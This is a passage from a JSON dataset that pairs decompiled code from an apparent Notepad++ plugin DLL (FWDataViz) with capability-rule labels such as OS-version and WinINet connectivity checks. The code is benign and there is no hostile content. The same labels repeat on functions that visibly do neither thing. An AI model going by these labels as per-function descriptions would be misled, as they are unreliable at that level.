'\\0') {\n        iVar9 = (**0x1800de678)(arg1[1], in_DX, arg1[2], 0x1800671c0);\n        arg1[3] = iVar9;\n    }\n    else {\n        iVar8 = (**0x1800de0e8)();\n        iVar10 = iVar9;\n        if (iVar8 != 0) {\n            iVar10 = (**0x1800de0e0)(arg1[1], iVar8);\n            iVar9 = 0;\n            if (iVar10 == 0) {\n                iVar10 = 0;\n            }\n            else {\n                arg2 = (**0x1800de3f8)(iVar10);\n                if (arg2 == 0) {\n                    iVar10 = 0;\n                }\n                else {\n                    uVar6 = (**0x1800de410)(arg1[1], iVar8);\n                    iVar10 = (**0x1800de290)(0x40, uVar6);\n                    iVar9 = (**0x1800de0f0)(iVar10);\n                    fcn.1800ade80(iVar9, arg2, uVar6);\n                    if (*(iVar9 + 2) == -1) {\n                        *(iVar9 + 8) = *(iVar9 + 8) | 0x400000;\n                    }\n                    else {\n                        *(iVar9 + 4) = *(iVar9 + 4) | 0x400000;\n                    }\n                }\n            }\n        }\n        iVar9 = (**0x1800de690)(arg1[1], iVar9, arg1[2], 0x1800671c0);\n        arg1[3] = iVar9;\n        (**0x1800de498)(iVar10);\n    }\n    if (arg1[3] == 0) {\n        _auStack88 = CONCAT44(*0x180101904, *0x180101900);\n        var_49h._1_4_ = *0x180101908;\n        stack0xffffffffffffffb4 = *0x18010190c;\n        uStack104 = 0;\n        fcn.180010d70(&uStack104, 0x1800fd1e0, 0x31);\n        uStack120 = CONCAT44(*0x180101904, *0x180101900);\n        uStack112 = *0x180101908;\n        uStack108 = *0x18010190c;\n        uStack136 = 0;\n        fcn.180010d70(&uStack136, 0x1800fa0c4, 0);\n        iVar7 = (**0x1800de400)();\n        if (iVar7 != 0) {\n            iStack144 = 0;\n            uStack200 = 0;\n            uStack208 = 0;\n            piStack216 = &iStack144;\n            (**0x1800de408)(0x1300, 0, iVar7, 0x400);\n            piVar11 = 0xffffffffffffffff;\n            do {\n                piVar11 = piVar11 + 1;\n            } while (*(iStack144 + piVar11 * 2) != 0);\n            if (CONCAT44(uStack108, uStack112) - uStack120 < piVar11) {\n                piStack216 = piVar11;\n                fcn.180013690(&uStack136, piVar11, 0, iStack144);\n            }\n            else {\n                piVar1 = uStack120 + piVar11;\n                puVar12 = &uStack136;\n                if (7 < CONCAT44(uStack108, uStack112)) {\n                    puVar12 = CONCAT44(uStack132, CONCAT22(uStack134, uStack136));\n                }\n                puVar2 = puVar12 + uStack120;\n                uStack120 = piVar1;\n                fcn.1800ade80(puVar2, iStack144, piVar11 * 2);\n                puVar12[piVar1] = 0;\n            }\n            (**0x1800de0f8)(iStack144);\n        }\n        uVar5 = uStack108;\n        uVar4 = uStack112;\n        piVar11 = uStack120;\n        uStack184 = CONCAT22(uStack134, uStack136);\n        uStack168 = uStack120;\n        uStack164 = uStack120._4_4_;\n        uStack160 = uStack112;\n        uStack156 = uStack108;\n        uStack180 = uStack132;\n        uStack176 = uStack128;\n        uStack172 = uStack124;\n        uStack136 = 0;\n        uStack120 = CONCAT44(*0x180101904, *0x180101900);\n        uStack112 = *0x180101908;\n        uStack108 = *0x18010190c;\n        puVar13 = CONCAT44(uStack132, uStack184);\n        uVar15 = CONCAT44(uVar5, uVar4);\n        puVar14 = &uStack184;\n        if (7 < uVar15) {\n            puVar14 = puVar13;\n        }\n        if (CONCAT44(stack0xffffffffffffffb4, var_49h._1_4_) - _auStack88 < piVar11) {\n            piStack216 = piVar11;\n            fcn.180013690(&uStack104, piVar11, 0, puVar14);\n            uVar15 = CONCAT44(uStack156, uStack160);\n            puVar13 = CONCAT44(uStack180, uStack184);\n        }\n        else {\n            iVar9 = piVar11 + _auStack88;\n            puVar12 = &uStack104;\n            if (7 < CONCAT44(stack0xffffffffffffffb4, var_49h._1_4_)) {\n                puVar12 = CONCAT62(_auStack102, uStack104);\n            }\n            puVar2 = puVar12 + _auStack88;\n            _auStack88 = iVar9;\n            fcn.1800ade80(puVar2, puVar14, piVar11 * 2);\n            puVar12[iVar9] = 0;\n        }\n        if (7 < uVar15) {\n            puVar14 = puVar13;\n            if ((0xfff < uVar15 * 2 + 2) && (puVar14 = *(puVar13 + -2),  0x1f < puVar13 + (-8 - puVar14)))\n            goto code_r0x0001800671b1;\n            fcn.18008fb24(puVar14);\n        }\n        puVar12 = &uStack104;\n        if (7 < CONCAT44(stack0xffffffffffffffb4, var_49h._1_4_)) {\n            puVar12 = CONCAT62(_auStack102, uStack104);\n        }\n        (**0x1800de710)(0, puVar12, L\"In StaticDialog::create()\", 0);\n        if (7 < CONCAT44(stack0xffffffffffffffb4, var_49h._1_4_)) {\n            iVar9 = CONCAT44(stack0xffffffffffffffb4, var_49h._1_4_) * 2;\n            iVar8 = CONCAT62(_auStack102, uStack104);\n            iVar10 = iVar8;\n            if (0xfff < iVar9 + 2U) {\n                iVar10 = *(iVar8 + -8);\n                if (0x1f < (iVar8 - iVar10) - 8U) {\n                    fcn.1800b3528(iVar10, iVar9 + 0x29);\ncode_r0x0001800671b1:\n                    fcn.1800b3528();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n            }\n            fcn.18008fb24(iVar10);\n        }\n    }\n    else {\n        fcn.18001fa50(arg1[3]);\n        iVar9 = arg1[3];\n        iVar10 = arg1[2];\n        if (in_R9B == '\\0') {\n            iVar10 = (**0x1800de760)(iVar10);\n        }\n        (**0x1800de7f0)(iVar10, 0x7f4, 0, iVar9);\n    }\n    fcn.18008fb00(stack0xffffffffffffffb8 ^ auStack248);\n    return;\n}\n",
        "token_count": 2361
    },
    "18006744": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180067440(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    ulong uVar5;\n    ulong uVar6;\n    ulong arg1;\n    ulong ****ppppuVar7;\n    uint64_t *puVar8;\n    uint64_t uVar9;\n    ulong uVar10;\n    uint64_t **ppuVar11;\n    uchar auStack792 [32];\n    ulong uStack760;\n    ulong ****appppuStack744 [3];\n    uint64_t uStack720;\n    ulong uStack712;\n    uchar auStack696 [128];\n    uchar auStack568 [528];\n    uint64_t uStack40;\n    \n    uStack712 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack792;\n    iVar3 = fcn.1800676e0();\n    if (iVar3 != 0) {\n        uVar4 = (**0x1800de6a8)();\n        uStack760 = 0x1800fd7f0;\n        (**0x1800de660)(iVar3, 0xb, 0x410, uVar4);\n        uVar5 = (**0x1800de6a8)();\n        uStack760 = 0x1800fd8e0;\n        (**0x1800de660)(iVar3, 0xc, 0x410, uVar5);\n        uVar6 = (**0x1800de6a8)();\n        uStack760 = 0x1800fd860;\n        (**0x1800de660)(iVar3, 0xd, 0x410, uVar6);\n        *0x18012a3b0 = 0xc;\n        iVar3 = (**0x1800de7f0)(*0x18012a390, 0x839, 0xc, 0x18012a3b8);\n        if (iVar3 != 0) {\n            (**0x1800de7f0)(*0x18012a390, 0x849, 0x104, 0x18012a3c0);\n            (**0x1800de568)(0x18012a3c0, L\"FWDataViz\");\n            (**0x1800de568)(0x18012a3c0, L\"Samples\");\n            uVar9 = 0;\n            if (*0x18012a3b0 != 0) {\n                puVar8 = 0x1801241a0;\n                do {\n                    iVar2 = *(puVar8 + -4);\n                    uVar10 = uVar4;\n                    if (((iVar2 == 0) || (uVar10 = uVar5,  iVar2 == 1)) || (uVar10 = uVar6,  iVar2 == 2)) {\n                        ppuVar11 = puVar8 + 1;\n                        if (7 < puVar8[4]) {\n                            ppuVar11 = *ppuVar11;\n                        }\n                        (**0x1800de580)(auStack568, 0x18012a3c0, ppuVar11);\n                        iVar2 = (**0x1800de570)();\n                        if (iVar2 != 0) {\n                            arg1 = fcn.1800687b0(auStack696);\n                            ppuVar11 = puVar8 + -3;\n                            if (0xf < *puVar8) {\n                                ppuVar11 = *ppuVar11;\n                            }\n                            fcn.180069050(arg1, appppuStack744, ppuVar11, puVar8[-1] + ppuVar11);\n                            fcn.1800686c0(auStack696);\n                            ppppuVar7 = appppuStack744;\n                            if (7 < uStack720) {\n                                ppppuVar7 = appppuStack744[0];\n                            }\n                            (**0x1800de6c8)(uVar10, 0, *0x18012a3b8 + uVar9, ppppuVar7);\n                            if (7 < uStack720) {\n                                ppppuVar7 = appppuStack744[0];\n                                if (0xfff < uStack720 * 2 + 2) {\n                                    ppppuVar7 = appppuStack744[0][-1];\n                                    if (0x1f < appppuStack744[0] + (-8 - ppppuVar7)) {\n                                        fcn.1800b3528(ppppuVar7, uStack720 * 2 + 0x29);\n                                        pcVar1 = swi(3);\n                                        (*pcVar1)();\n                                        return;\n                                    }\n                                }\n                                fcn.18008fb24(ppppuVar7);\n                            }\n                        }\n                    }\n                    uVar9 = uVar9 + 1;\n                    puVar8 = puVar8 + 0xd;\n                } while (uVar9 < *0x18012a3b0);\n            }\n        }\n    }\n    fcn.18008fb00(uStack40 ^ auStack792);\n    return;\n}\n",
        "token_count": 1125
    },
    "1800676e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.1800676e0(void)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    ulong uVar6;\n    uint16_t *puVar7;\n    ulong uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int64_t iVar11;\n    uint16_t *puVar12;\n    uint16_t *puVar13;\n    bool bVar14;\n    bool bVar15;\n    uchar auStack664 [32];\n    uint uStack632;\n    uint16_t uStack616;\n    unkbyte6 Stack614;\n    int64_t iStack600;\n    uint64_t uStack592;\n    uint uStack584;\n    int16_t aiStack568 [264];\n    uint64_t uStack40;\n    \n    uStack40 = *0x180123080 ^ auStack664;\n    iVar10 = 0;\n    uStack584 = 0;\n    uVar6 = (**0x1800de7f0)(*0x18012a390, 0x801, 0, 0);\n    iVar4 = (**0x1800de6a0)(uVar6);\n    iVar9 = iVar10;\n    if (0 < iVar4) {\n        do {\n            uStack632 = 0x400;\n            iVar5 = (**0x1800de670)(uVar6, iVar10, aiStack568, 0x104);\n            if (iVar5 < 1) {\n                puVar13 = CONCAT62(Stack614, uStack616);\n            }\n            else {\n                iStack600 = 0;\n                uStack592 = 7;\n                iVar11 = -1;\n                uStack616 = 0;\n                do {\n                    iVar11 = iVar11 + 1;\n                } while (aiStack568[iVar11] != 0);\n                fcn.180010d70(&uStack616, aiStack568, iVar11);\n                puVar13 = CONCAT62(Stack614, uStack616);\n                iVar9 = 1;\n                puVar12 = &uStack616;\n                if (7 < uStack592) {\n                    puVar12 = puVar13;\n                }\n                if (iStack600 == 0x1b) {\n                    uVar2 = *puVar12;\n                    iVar11 = 0x1b;\n                    puVar7 = 0x1800fd8a8;\n                    if (0x45 < uVar2) {\n                        bVar14 = uVar2 < 0x46;\n                        bVar15 = uVar2 == 0x46;\n                        do {\n                            if (!bVar14 && !bVar15) break;\n                            if (iVar11 == 1) {\n                                bVar14 = true;\n                                goto code_r0x00018006782d;\n                            }\n                            puVar1 = puVar12 + -0xc007ec53 + puVar7;\n                            puVar7 = puVar7 + 1;\n                            iVar11 = iVar11 + -1;\n                            bVar14 = *puVar1 < *puVar7;\n                            bVar15 = *puVar1 == *puVar7;\n                        } while (!bVar14);\n                    }\n                }\n            }\n            bVar14 = false;\ncode_r0x00018006782d:\n            if ((iVar9 != 0) && (iVar9 = 0,  7 < uStack592)) {\n                puVar12 = puVar13;\n                if ((0xfff < uStack592 * 2 + 2) && (puVar12 = *(puVar13 + -4),  0x1f < puVar13 + (-8 - puVar12))) {\n                    fcn.1800b3528();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                fcn.18008fb24(puVar12);\n            }\n            if (bVar14) {\n                uVar8 = (**0x1800de668)(uVar6);\n                iVar5 = (**0x1800de658)(uVar8, *0x18012a658, 0);\n                if (iVar5 != -1) break;\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < iVar4);\n    }\n    fcn.18008fb00(uStack40 ^ auStack664);\n    return;\n}\n",
        "token_count": 968
    },
    "1800679c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1800679c0(ulong *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uchar auStack72 [32];\n    ulong uStack40;\n    ulong *puStack32;\n    uint64_t uStack24;\n    \n    uStack40 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack72;\n    if (arg1[2] != 0) {\n        piVar2 = fcn.1800ba53c(arg1);\n        if (0xf < arg1[3]) {\n            arg1 = *arg1;\n        }\n        *piVar2 = 0;\n        fcn.1800ba42c(arg1, &puStack32);\n        if (arg1 == puStack32) {\n            fcn.18006df40(\"invalid stoi argument\");\n        }\n        else if (*piVar2 != 0x22) goto code_r0x000180067a2c;\n        fcn.18006df88(\"stoi argument out of range\");\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\ncode_r0x000180067a2c:\n    fcn.18008fb00(uStack24 ^ auStack72);\n    return;\n}\n",
        "token_count": 289
    },
    "180067a7": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180067a70(ulong *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uchar auStack72 [32];\n    ulong uStack40;\n    ulong *puStack32;\n    uint64_t uStack24;\n    \n    uStack40 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack72;\n    if (arg1[2] != 0) {\n        piVar2 = fcn.1800ba53c(arg1);\n        if (7 < arg1[3]) {\n            arg1 = *arg1;\n        }\n        *piVar2 = 0;\n        fcn.1800ba458(arg1, &puStack32);\n        if (arg1 == puStack32) {\n            fcn.18006df40(\"invalid stoi argument\");\n        }\n        else if (*piVar2 != 0x22) goto code_r0x000180067adc;\n        fcn.18006df88(\"stoi argument out of range\");\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\ncode_r0x000180067adc:\n    fcn.18008fb00(uStack24 ^ auStack72);\n    return;\n}\n",
        "token_count": 282
    },
    "180067c6": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180067c60(ulong *arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    ulong *puVar4;\n    uchar auStack392 [80];\n    ulong uStack312;\n    ulong uStack304;\n    ulong uStack200;\n    uchar auStack56 [16];\n    uchar auStack40 [16];\n    int64_t *piStack24;\n    uint64_t uStack16;\n    \n    uStack200 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack392;\n    auStack40 = ZEXT816(0);\n    piStack24 = NULL;\n    auStack56 = ZEXT816(0);\n    uStack312 = arg3;\n    uStack304 = arg2;\n    fcn.180010540(auStack56 + 8);\n    puVar4 = arg1;\n    if (7 < arg1[3]) {\n        puVar4 = *arg1;\n    }\n    piVar1 = arg1 + 2;\n    if (7 < arg1[3]) {\n        arg1 = *arg1;\n    }\n    fcn.1800131f0(auStack56, arg1, puVar4 + *piVar1 * 2);\n    if (auStack56._0_8_ != NULL) {\n        LOCK();\n        piVar2 = auStack56._0_8_ + 0x2c;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar3 == 1) {\n            while (auStack56._0_8_ != NULL) {\n                puVar4 = auStack56._0_8_[2];\n                auStack56._0_8_[2] = 0;\n                (***auStack56._0_8_)(auStack56._0_8_, 1);\n                auStack56._0_8_ = puVar4;\n            }\n        }\n    }\n    auStack56 = ZEXT816(auStack56._8_8_) << 0x40;\n    if ((piStack24 != NULL) && (puVar4 = (**(*piStack24 + 0x10))(),  puVar4 != NULL)) {\n        (***puVar4)(puVar4, 1);\n    }\n    fcn.18008fb00(uStack16 ^ auStack392);\n    return;\n}\n",
        "token_count": 557
    },
    "18006804": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180068040(uint32_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uchar *puVar5;\n    ulong *****pppppuVar6;\n    int64_t iVar7;\n    uchar auVar8 [16];\n    uchar auStack808 [32];\n    uint32_t uStack776;\n    ulong uStack768;\n    uint32_t uStack760;\n    uint32_t uStack756;\n    uint32_t uStack752;\n    uint32_t uStack748;\n    uint uStack744;\n    uint uStack740;\n    uint uStack736;\n    uint uStack732;\n    ulong uStack728;\n    int64_t iStack720;\n    uint16_t *puStack712;\n    int32_t aiStack704 [2];\n    ulong *****apppppuStack696 [2];\n    ulong uStack680;\n    uint64_t uStack672;\n    uint auStack664 [2];\n    uchar uStack656;\n    unkbyte7 Stack655;\n    uint uStack640;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    uint32_t uStack624;\n    uint32_t uStack620;\n    uint32_t uStack616;\n    uint32_t uStack612;\n    uchar auStack608 [16];\n    uchar auStack584 [528];\n    uint64_t uStack56;\n    \n    uStack728 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack808;\n    auVar8 = CONCAT412(*0x18010190c, CONCAT48(*0x180101908, CONCAT44(*0x180101904, *0x180101900)));\n    uStack624 = uStack624 & 0xffff0000;\n    auStack664[0] = 0;\n    aiStack704[0] = 0;\n    iStack720 = 0;\n    puStack712 = NULL;\n    auStack608 = auVar8;\n    (**0x1800de100)(*0x18012a388, auStack584);\n    uVar2 = (**0x1800de8c0)(auStack584, auStack664);\n    if (uVar2 == 0) {\n        *(arg1 + 4) = 0;\n        *(arg1 + 6) = 7;\n        *arg1 = 0;\n        fcn.180010d70(arg1, 0x1800fa274, 0);\n        goto code_r0x0001800681a6;\n    }\n    uStack640 = *0x180101910;\n    uStack636 = *0x180101914;\n    uStack632 = *0x180101918;\n    uStack628 = *0x18010191c;\n    uStack656 = 0;\n    fcn.180010fa0(&uStack656, uVar2);\n    puVar5 = &uStack656;\n    if (0xf < CONCAT44(uStack628, uStack632)) {\n        puVar5 = CONCAT71(Stack655, uStack656);\n    }\n    iVar3 = (**0x1800de8c8)(auStack584, 0, uVar2, puVar5);\n    if (iVar3 == 0) {\n        *(arg1 + 4) = 0;\n        *(arg1 + 6) = 7;\n        *arg1 = 0;\n        fcn.180010d70(arg1, 0x1800fa2c4, 0);\n        if (CONCAT44(uStack628, uStack632) < 0x10) goto code_r0x0001800681a6;\n        iVar7 = CONCAT71(Stack655, uStack656);\n        if (0xfff < CONCAT44(uStack628, uStack632) + 1) {\n            iVar4 = iVar7 - *(iVar7 + -8);\n            iVar7 = *(iVar7 + -8);\njoined_r0x000180068403:\n            if (0x1f < iVar4 - 8U) {\ncode_r0x000180068410:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n    }\n    else {\n        puVar5 = &uStack656;\n        if (0xf < CONCAT44(uStack628, uStack632)) {\n            puVar5 = CONCAT71(Stack655, uStack656);\n        }\n        (**0x1800de8b8)(puVar5, L\"\\\\VarFileInfo\\\\Translation\");\n        uStack680 = 0;\n        uStack672 = 7;\n        apppppuStack696[0] = apppppuStack696[0] & 0xffffffffffff0000;\n        apppppuStack696[0] = fcn.180011cf0(apppppuStack696, 0x68);\n        uStack680 = 100;\n        uStack672 = 0x67;\n        *apppppuStack696[0] = NULL;\n        apppppuStack696[0][1] = NULL;\n        apppppuStack696[0][2] = NULL;\n        apppppuStack696[0][3] = NULL;\n        apppppuStack696[0][4] = NULL;\n        apppppuStack696[0][5] = NULL;\n        apppppuStack696[0][6] = NULL;\n        apppppuStack696[0][7] = NULL;\n        apppppuStack696[0][8] = NULL;\n        apppppuStack696[0][9] = NULL;\n        apppppuStack696[0][10] = NULL;\n        apppppuStack696[0][0xb] = NULL;\n        apppppuStack696[0][0xc] = NULL;\n        apppppuStack696[0][0xd] = NULL;\n        apppppuStack696[0][0xe] = NULL;\n        apppppuStack696[0][0xf] = NULL;\n        apppppuStack696[0][0x10] = NULL;\n        apppppuStack696[0][0x11] = NULL;\n        apppppuStack696[0][0x12] = NULL;\n        apppppuStack696[0][0x13] = NULL;\n        apppppuStack696[0][0x14] = NULL;\n        apppppuStack696[0][0x15] = NULL;\n        apppppuStack696[0][0x16] = NULL;\n        apppppuStack696[0][0x17] = NULL;\n        apppppuStack696[0][0x18] = NULL;\n        *(apppppuStack696[0] + 0x19) = 0;\n        uStack776 = puStack712[1];\n        uStack768 = arg2;\n        fcn.180020a90(apppppuStack696[0], 100, L\"\\\\StringFileInfo\\\\%04X%04X\\\\%s\", *puStack712);\n        pppppuVar6 = apppppuStack696;\n        if (7 < uStack672) {\n            pppppuVar6 = apppppuStack696[0];\n        }\n        puVar5 = &uStack656;\n        if (0xf < CONCAT44(uStack628, uStack632)) {\n            puVar5 = CONCAT71(Stack655, uStack656);\n        }\n        iVar3 = (**0x1800de8b8)(puVar5, pppppuVar6, &iStack720, aiStack704);\n        uVar2 = uStack624;\n        if ((iVar3 != 0) && (aiStack704[0] != 0)) {\n            uStack744 = *0x180101900;\n            uStack740 = *0x180101904;\n            uStack736 = *0x180101908;\n            uStack732 = *0x18010190c;\n            uStack760 = uStack760 & 0xffff0000;\n            iVar7 = -1;\n            do {\n                iVar7 = iVar7 + 1;\n            } while (*(iStack720 + iVar7 * 2) != 0);\n            fcn.180010d70(&uStack760, iStack720, iVar7);\n            auVar8 = CONCAT412(uStack732, CONCAT48(uStack736, CONCAT44(uStack740, uStack744)));\n            uVar2 = uStack760;\n            uStack620 = uStack756;\n            uStack616 = uStack752;\n            uStack612 = uStack748;\n        }\n        *arg1 = uVar2;\n        arg1[1] = uStack620;\n        arg1[2] = uStack616;\n        arg1[3] = uStack612;\n        *(arg1 + 4) = auVar8;\n        if (7 < uStack672) {\n            pppppuVar6 = apppppuStack696[0];\n            if (0xfff < uStack672 * 2 + 2) {\n                pppppuVar6 = apppppuStack696[0][-1];\n                if (0x1f < apppppuStack696[0] + (-8 - pppppuVar6)) {\n                    fcn.1800b3528(pppppuVar6, uStack672 * 2 + 0x29);\n                    goto code_r0x000180068410;\n                }\n            }\n            fcn.18008fb24(pppppuVar6);\n        }\n        uStack680 = 0;\n        uStack672 = 7;\n        apppppuStack696[0] = apppppuStack696[0] & 0xffffffffffff0000;\n        if (CONCAT44(uStack628, uStack632) < 0x10) goto code_r0x0001800681a6;\n        iVar7 = CONCAT71(Stack655, uStack656);\n        if (0xfff < CONCAT44(uStack628, uStack632) + 1) {\n            iVar4 = iVar7 - *(iVar7 + -8);\n            iVar7 = *(iVar7 + -8);\n            goto joined_r0x000180068403;\n        }\n    }\n    fcn.18008fb24(iVar7);\ncode_r0x0001800681a6:\n    fcn.18008fb00(uStack56 ^ auStack808);\n    return;\n}\n",
        "token_count": 2284
    },
    "1800687b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1800687b0(code **arg1)\n\n{\n    code *pcVar1;\n    code **arg1_00;\n    int64_t *arg1_01;\n    int64_t iVar2;\n    ulong *puVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uchar auStack104 [32];\n    ulong uStack72;\n    code **ppcStack56;\n    code **ppcStack40;\n    uint64_t uStack32;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack104;\n    *arg1 = \n    vtable.std::wstring_convert_class_std::codecvt_utf8_wchar_t__1114111__0___wchar_t__class_std::allocator_wchar_t___class_std::allocator_char__.0\n    ;\n    ppcStack56 = arg1;\n    pcVar1 = fcn.180073b64();\n    arg1[3] = pcVar1;\n    arg1[6] = NULL;\n    arg1[7] = 0xf;\n    *(arg1 + 4) = 0;\n    arg1[10] = NULL;\n    arg1[0xb] = 0x7;\n    *(arg1 + 8) = 0;\n    *(arg1 + 0xd) = 0;\n    *(arg1 + 0x6a) = 0;\n    arg1_00 = fcn.18008fb2c(0x40);\n    ppcStack40 = arg1_00;\n    fcn.180002670(arg1_00);\n    *arg1_00 = vtable.std::codecvt_utf8_wchar_t__1114111__0_.0;\n    arg1[0xc] = NULL;\n    arg1[1] = arg1_00;\n    arg1_01 = fcn.180073d14(arg1[3]);\n    if (*0x1801286f8 == 0) {\n        fcn.18006da30(&ppcStack40, 0);\n        if (*0x1801286f8 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x1801286f8 = *0x1801286b8;\n        }\n        fcn.18006dab0(&ppcStack40);\n    }\n    fcn.180071848(arg1_01, arg1_00, *0x1801286f8);\n    *(arg1_01 + 4) = 0;\n    iVar2 = arg1_01[5];\n    if (iVar2 != 0x1800f45a0) {\n        if (iVar2 != 0) {\n            fcn.1800b2bb8(iVar2);\n        }\n        arg1_01[5] = 0;\n        pcVar4 = 0x1800f45a0;\n        do {\n            pcVar5 = pcVar4;\n            pcVar4 = pcVar5 + 1;\n        } while (*pcVar4 != '\\0');\n        pcVar5 = pcVar5 + -0x1800f459e;\n        iVar2 = fcn.1800b35a0(pcVar5);\n        arg1_01[5] = iVar2;\n        if (iVar2 != 0) {\n            fcn.1800ade80(iVar2, 0x1800f45a0, pcVar5);\n        }\n    }\n    if (arg1[3] != arg1_01) {\n        puVar3 = (**(*arg1[3] + 0x10))();\n        if (puVar3 != NULL) {\n            (***puVar3)(puVar3, 1);\n        }\n        arg1[3] = arg1_01;\n        (**(*arg1_01 + 8))(arg1_01);\n    }\n    puVar3 = (**(*arg1_01 + 0x10))(arg1_01);\n    if (puVar3 != NULL) {\n        (***puVar3)(puVar3, 1);\n    }\n    arg1[0xe] = NULL;\n    fcn.18008fb00(uStack32 ^ auStack104);\n    return;\n}\n",
        "token_count": 940
    },
    "180068c5": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Variable defined which should be unmapped: var_29h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Variable defined which should be unmapped: var_39h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180068c50(int64_t arg1, ulong ******arg2, uchar *arg3, uchar *arg4)\n\n{\n    ulong *puVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    ulong ******ppppppuVar7;\n    uint64_t uVar8;\n    uchar **arg2_00;\n    ulong var_fh;\n    uchar auStack264 [32];\n    uchar **ppuStack232;\n    ulong ******ppppppuStack224;\n    int64_t iStack216;\n    ulong ******ppppppuStack208;\n    uchar *puStack200;\n    uchar auStack192 [24];\n    ulong uStack168;\n    uchar *puStack160;\n    ulong ******ppppppuStack152;\n    ulong ******ppppppuStack144;\n    uchar uStack136;\n    uint64_t uStack128;\n    uchar auStack120 [7];\n    ulong var_69h;\n    ulong var_61h;\n    ulong uStack96;\n    uchar auStack88 [7];\n    uint64_t var_49h;\n    ulong var_41h;\n    ulong var_39h;\n    ulong var_31h;\n    ulong var_29h;\n    ulong var_21h;\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_1h;\n    \n    uStack168 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack264;\n    _auStack120 = 0xf;\n    uStack96 = 0;\n    uVar8 = 0xf;\n    _auStack88 = 0xf;\n    var_69h._1_4_ = var_69h._1_4_ & 0xffffff00;\n    if (*(arg1 + 0x68) == '\\0') {\n        *(arg1 + 0x60) = 0;\n    }\n    uStack128 = 8;\n    ppppppuStack144 = NULL;\n    uStack136 = 0;\n    *(arg1 + 0x70) = 0;\n    puStack200 = arg3;\n    puStack160 = arg3;\n    ppppppuStack152 = arg2;\n    if (arg3 != arg4) {\n        do {\n            ppppppuVar7 = &ppppppuStack144;\n            if (0xf < _auStack120) {\n                ppppppuVar7 = ppppppuStack144;\n            }\n            iStack216 = uStack128 + ppppppuVar7;\n            ppppppuStack208 = &ppppppuStack152;\n            ppuStack232 = &puStack160;\n            ppppppuStack224 = ppppppuVar7;\n            iVar5 = (**(**(arg1 + 8) + 0x38))();\n            uVar4 